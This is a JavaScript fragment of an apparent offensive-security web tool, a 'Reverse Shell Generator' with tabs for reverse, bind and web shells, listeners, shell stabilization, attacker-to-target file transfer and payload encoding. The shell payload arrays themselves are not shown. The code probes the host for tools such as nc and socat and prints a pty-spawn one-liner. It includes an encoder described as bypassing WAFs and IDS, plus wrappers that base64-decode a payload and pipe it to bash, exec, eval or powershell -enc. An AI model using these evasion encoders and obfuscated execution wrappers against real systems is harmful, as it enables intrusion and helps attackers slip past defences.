        const shells = ['bash','sh','python3','python','php','ruby','perl','nc','ncat','socat','powershell','lua','awk'];
        const found = [];
        for (const s of shells) { if (window._bridge.hasTool(s)) found.push(s); }
        if (!found.length) {
          try {
            for (const s of shells) { const r = await window._bridge.exec('which ' + s + ' 2>/dev/null'); if (r.stdout && r.stdout.trim()) found.push(s); }
          } catch {}
        }
        cliInfo.innerHTML = '<span style="color:#22c55e;font-weight:700">[CLI CONNECTED]</span> <span style="color:#c8d6e5">Available: </span>' + (found.length ? found.map(f => '<code style="color:#00ff88;background:rgba(0,255,136,.1);padding:2px 6px;border-radius:3px;margin:0 3px">' + f + '</code>').join('') : '<span style="color:#f59e0b">None detected</span>');
      })();
    }

    const warn = document.createElement('div');
    warn.className = 'rs-warn';
    warn.textContent = 'For authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal.';
    div.appendChild(warn);

    const config = document.createElement('div');
    config.className = 'rs-config';
    config.innerHTML = `
      <label>LHOST</label>
      <input class="rs-input ip" type="text" value="${esc(ip)}" placeholder="10.10.10.1">
      <label>LPORT</label>
      <input class="rs-input port" type="text" value="${esc(port)}" placeholder="4444">
      <label>Filter</label>
      <input class="rs-input filter" type="text" value="${esc(filter)}" placeholder="Search language...">
    `;
    div.appendChild(config);

    const ipInput = config.querySelector('.ip');
    const portInput = config.querySelector('.port');
    const filterInput = config.querySelector('.filter');

    ipInput.oninput = () => { ip = ipInput.value.trim() || '10.10.10.1'; renderContent(); };
    portInput.oninput = () => { port = portInput.value.trim() || '4444'; renderContent(); };
    filterInput.oninput = () => { filter = filterInput.value.trim().toLowerCase(); renderContent(); };

    const grid = document.createElement('div');
    grid.className = 'rs-grid';

    const filtered = RS_SHELLS.filter(s => !filter || s.lang.toLowerCase().includes(filter) || s.tag.includes(filter));

    if (filtered.length === 0) {
      const empty = document.createElement('div');
      empty.className = 'rs-empty';
      empty.textContent = 'No shells match your filter.';
      grid.appendChild(empty);
    } else {
      filtered.forEach(shell => {
        const group = document.createElement('div');
        group.className = 'rs-lang-group';

        const head = document.createElement('div');
        head.className = 'rs-lang-head';
        head.innerHTML = `
          <div class="rs-lang-name">${esc(shell.lang)} <span class="rs-lang-tag">${esc(shell.tag)}</span></div>
          <span class="rs-lang-count">${shell.variants.length} variant${shell.variants.length > 1 ? 's' : ''}</span>
        `;

        const variants = document.createElement('div');
        variants.className = 'rs-variants';

        head.onclick = () => variants.classList.toggle('open');

        shell.variants.forEach(v => {
          const vDiv = document.createElement('div');
          vDiv.className = 'rs-variant';
          const nameEl = document.createElement('div');
          nameEl.className = 'rs-variant-name';
          nameEl.textContent = v.name;
          vDiv.appendChild(nameEl);
          const code = v.cmd(ip, port);
          vDiv.appendChild(renderCodeBlock(code));
          variants.appendChild(vDiv);
        });

        group.append(head, variants);
        grid.appendChild(group);
      });
    }
    div.appendChild(grid);

    // Bind Shells section
    const bindSection = document.createElement('div');
    bindSection.className = 'rs-section';
    bindSection.style.marginTop = '28px';
    const bh3 = document.createElement('h3');
    bh3.textContent = 'Bind Shells';
    bh3.style.color = '#ff9100';
    bindSection.appendChild(bh3);
    const bindDesc = document.createElement('p');
    bindDesc.style.cssText = 'font-size:12px;color:#6a8aaa;margin:0 0 12px';
    bindDesc.textContent = 'Bind shells open a listening port on the target. Connect from your machine with: nc <TARGET_IP> <PORT>';
    bindSection.appendChild(bindDesc);

    RS_BIND_SHELLS.forEach(b => {
      const bDiv = document.createElement('div');
      bDiv.className = 'rs-listener';
      const name = document.createElement('div');
      name.className = 'rs-listener-name';
      name.style.color = '#ff9100';
      name.textContent = b.lang;
      bDiv.appendChild(name);
      bDiv.appendChild(renderCodeBlock(b.cmd(port)));
      bindSection.appendChild(bDiv);
    });
    div.appendChild(bindSection);

    // Web Shells section
    const webSection = document.createElement('div');
    webSection.className = 'rs-section';
    webSection.style.marginTop = '28px';
    const wh3 = document.createElement('h3');
    wh3.textContent = 'Web Shells';
    wh3.style.color = '#ff4444';
    webSection.appendChild(wh3);
    const webDesc = document.createElement('p');
    webDesc.style.cssText = 'font-size:12px;color:#6a8aaa;margin:0 0 12px';
    webDesc.textContent = 'Minimal web shells for command execution via HTTP. Upload to target web root and access via browser.';
    webSection.appendChild(webDesc);

    RS_WEB_SHELLS.forEach(w => {
      const wDiv = document.createElement('div');
      wDiv.className = 'rs-listener';
      const name = document.createElement('div');
      name.className = 'rs-listener-name';
      name.textContent = w.lang;
      wDiv.appendChild(name);
      wDiv.appendChild(renderCodeBlock(w.cmd));
      webSection.appendChild(wDiv);
    });
    div.appendChild(webSection);

    return div;
  }

  function renderListeners() {
    const div = document.createElement('div');

    const warn = document.createElement('div');
    warn.className = 'rs-warn';
    warn.textContent = 'Set up your listener before sending the reverse shell payload.';
    div.appendChild(warn);

    const config = document.createElement('div');
    config.className = 'rs-config';
    config.innerHTML = `
      <label>LHOST</label>
      <input class="rs-input ip" type="text" value="${esc(ip)}" placeholder="0.0.0.0">
      <label>LPORT</label>
      <input class="rs-input port" type="text" value="${esc(port)}" placeholder="4444">
    `;
    div.appendChild(config);

    const ipInput = config.querySelector('.ip');
    const portInput = config.querySelector('.port');
    ipInput.oninput = () => { ip = ipInput.value.trim() || '10.10.10.1'; renderContent(); };
    portInput.oninput = () => { port = portInput.value.trim() || '4444'; renderContent(); };

    RS_LISTENERS.forEach(l => {
      const lDiv = document.createElement('div');
      lDiv.className = 'rs-listener';
      const name = document.createElement('div');
      name.className = 'rs-listener-name';
      name.textContent = l.name;
      lDiv.appendChild(name);
      lDiv.appendChild(renderCodeBlock(l.cmd(ip, port)));
      div.appendChild(lDiv);
    });

    return div;
  }

  function renderStabilize() {
    const div = document.createElement('div');

    const section = document.createElement('div');
    section.className = 'rs-section';
    const h3 = document.createElement('h3');
    h3.textContent = 'Shell Stabilization Techniques';
    section.appendChild(h3);

    const info = document.createElement('div');
    info.className = 'rs-info';
    info.innerHTML = `
      <p style="margin:0 0 8px;font-size:13px;color:#c8d6e5">After catching a reverse shell, you'll want a <strong>fully interactive TTY</strong>. The typical flow:</p>
      <ol style="margin:0;padding-left:20px;font-size:12px;color:#6a8aaa;line-height:2">
        <li>Spawn PTY: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></li>
        <li>Background shell: <code>Ctrl+Z</code></li>
        <li>Fix terminal: <code>stty raw -echo; fg</code></li>
        <li>Set vars: <code>export TERM=xterm-256color</code></li>
      </ol>
    `;
    section.appendChild(info);

    RS_STABILIZE.forEach(s => {
      const sDiv = document.createElement('div');
      sDiv.className = 'rs-stab';
      const name = document.createElement('div');
      name.className = 'rs-stab-name';
      name.textContent = s.name;
      const desc = document.createElement('div');
      desc.className = 'rs-stab-desc';
      desc.textContent = s.desc;
      sDiv.append(name, desc);
      sDiv.appendChild(renderCodeBlock(s.cmd));
      section.appendChild(sDiv);
    });

    div.appendChild(section);

    // File Transfer section
    const ftSection = document.createElement('div');
    ftSection.className = 'rs-section';
    ftSection.style.marginTop = '28px';
    const fth3 = document.createElement('h3');
    fth3.textContent = 'File Transfer Methods';
    fth3.style.color = '#ff9100';
    ftSection.appendChild(fth3);

    const ftDesc = document.createElement('p');
    ftDesc.style.cssText = 'font-size:12px;color:#6a8aaa;margin:0 0 12px';
    ftDesc.textContent = 'Common methods to transfer files between attacker and target after getting a shell.';
    ftSection.appendChild(ftDesc);

    RS_FILE_TRANSFERS.forEach(f => {
      const fDiv = document.createElement('div');
      fDiv.className = 'rs-stab';
      const name = document.createElement('div');
      name.className = 'rs-stab-name';
      name.style.color = '#ff9100';
      name.textContent = f.name;
      const desc = document.createElement('div');
      desc.className = 'rs-stab-desc';
      desc.textContent = f.desc;
      fDiv.append(name, desc);
      fDiv.appendChild(renderCodeBlock(f.cmd));
      ftSection.appendChild(fDiv);
    });

    div.appendChild(ftSection);
    return div;
  }

  function renderEncode() {
    const div = document.createElement('div');
    div.className = 'rs-encode-area';

    const section = document.createElement('div');
    section.className = 'rs-section';
    const h3 = document.createElement('h3');
    h3.textContent = 'Payload Encoder';
    section.appendChild(h3);

    const desc = document.createElement('p');
    desc.style.cssText = 'font-size:12px;color:#6a8aaa;margin:0 0 12px';
    desc.textContent = 'Paste a payload below and encode it. Useful for bypassing WAFs, IDS, or input filters.';
    section.appendChild(desc);

    const inputArea = document.createElement('textarea');
    inputArea.className = 'rs-textarea';
    inputArea.placeholder = 'Paste payload here...';
    inputArea.rows = 5;
    section.appendChild(inputArea);

    const btns = document.createElement('div');
    btns.className = 'rs-encode-btns';

    const outputArea = document.createElement('textarea');
    outputArea.className = 'rs-textarea';
    outputArea.placeholder = 'Encoded output will appear here...';
    outputArea.rows = 5;
    outputArea.readOnly = true;

    const encoders = [
      { label: 'Base64', fn: s => { try { return window.btoa(s); } catch { return 'Error: input contains non-ASCII'; } } },
      { label: 'Base64 Decode', fn: s => { try { return window.atob(s); } catch { return 'Error: invalid base64'; } } },
      { label: 'URL Encode', fn: s => encodeURIComponent(s) },
      { label: 'URL Decode', fn: s => { try { return decodeURIComponent(s); } catch { return 'Error: invalid URL encoding'; } } },
      { label: 'Hex Encode', fn: s => Array.from(new TextEncoder().encode(s)).map(b => '\\x' + b.toString(16).padStart(2, '0')).join('') },
      { label: 'Unicode Escape', fn: s => s.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('') },
      { label: 'Double URL', fn: s => encodeURIComponent(encodeURIComponent(s)) },
      { label: 'HTML Entities', fn: s => Array.from(s).map(c => `&#${c.codePointAt(0)};`).join('') },
      { label: 'Octal', fn: s => Array.from(new TextEncoder().encode(s)).map(b => '\\' + b.toString(8).padStart(3, '0')).join('') },
      { label: 'ROT13', fn: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))) },
      { label: 'Reverse', fn: s => Array.from(s).reverse().join('') },
      { label: 'Char Codes', fn: s => Array.from(s).map(c => c.codePointAt(0)).join(',') },
    ];

    encoders.forEach(enc => {
      const btn = document.createElement('button');
      btn.className = 'rs-btn';
      btn.textContent = enc.label;
      btn.onclick = () => {
        const val = inputArea.value;
        if (!val) return;
        outputArea.value = enc.fn(val);
      };
      btns.appendChild(btn);
    });

    section.appendChild(btns);
    section.appendChild(outputArea);

    const copyBtn = document.createElement('button');
    copyBtn.className = 'rs-btn';
    copyBtn.textContent = 'Copy Output';
    copyBtn.style.marginTop = '8px';
    copyBtn.onclick = () => {
      if (!outputArea.value) return;
      navigator.clipboard.writeText(outputArea.value).then(() => {
        copyBtn.textContent = 'Copied!';
        setTimeout(() => copyBtn.textContent = 'Copy Output', 1500);
      });
    };
    section.appendChild(copyBtn);

    const wrapSection = document.createElement('div');
    wrapSection.className = 'rs-section';
    wrapSection.style.marginTop = '24px';
    const h3b = document.createElement('h3');
    h3b.textContent = 'Encoding Wrappers';
    wrapSection.appendChild(h3b);

    const wrappers = [
      { name: 'Bash Base64', cmd: `echo '<PAYLOAD>' | base64 | base64 -d | bash`, desc: 'Encode payload then pipe through base64 decode to bash' },
      { name: 'Python Base64 exec', cmd: `python3 -c "import base64;exec(base64.b64decode('<B64_PAYLOAD>'))"`, desc: 'Base64 decode and execute in Python' },
      { name: 'PowerShell -enc', cmd: `powershell -enc <BASE64_UTF16LE_PAYLOAD>`, desc: 'PowerShell accepts Base64-encoded UTF-16LE commands' },
      { name: 'Perl eval decode', cmd: `perl -e 'use MIME::Base64;eval(decode_base64("<B64_PAYLOAD>"))'`, desc: 'Base64 decode and eval in Perl' },
      { name: 'PHP base64_decode', cmd: `php -r 'eval(base64_decode("<B64_PAYLOAD>"));'`, desc: 'Base64 decode and eval in PHP' },
    ];

    wrappers.forEach(w => {
      const wDiv = document.createElement('div');
      wDiv.className = 'rs-stab';
      const name = document.createElement('div');
      name.className = 'rs-stab-name';
      name.textContent = w.name;
      const d = document.createElement('div');
      d.className = 'rs-stab-desc';
      d.textContent = w.desc;
      wDiv.append(name, d);
      wDiv.appendChild(renderCodeBlock(w.cmd));
      wrapSection.appendChild(wDiv);
    });

    section.appendChild(wrapSection);
    div.appendChild(section);
    return div;
  }

  function renderContent() {
    const body = container.querySelector('.rs-body');
    if (!body) return;
    body.innerHTML = '';

    if (activeTab === 'generator') body.appendChild(renderGenerator());
    else if (activeTab === 'listeners') body.appendChild(renderListeners());
    else if (activeTab === 'stabilize') body.appendChild(renderStabilize());
    else if (activeTab === 'encode') body.appendChild(renderEncode());
  }

  function render() {
    container.innerHTML = `
      <div class="rs-wrap">
        <div class="rs-header">
          <h2>\u{1f41a} Reverse Shell Generator <span>20+ languages • Listeners • Stabilize • Encode</span></h2>
        </div>
        <div class="rs-tabs">
          ${tabs.map(t => `<button class="rs-tab${t.id === activeTab ? ' active' : ''}" data-tab="${t.id}">${t.label}</button>`).join('')}
        </div>
        <div class="rs-body"></div>
      </div>
    `;

    container.querySelectorAll('.rs-tab').forEach(tab => {
      tab.onclick = () => {
        activeTab = tab.dataset.tab;
        container.querySelectorAll('.rs-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === activeTab));
        renderContent();
      };
    });

    renderContent();
  }

  render();
}
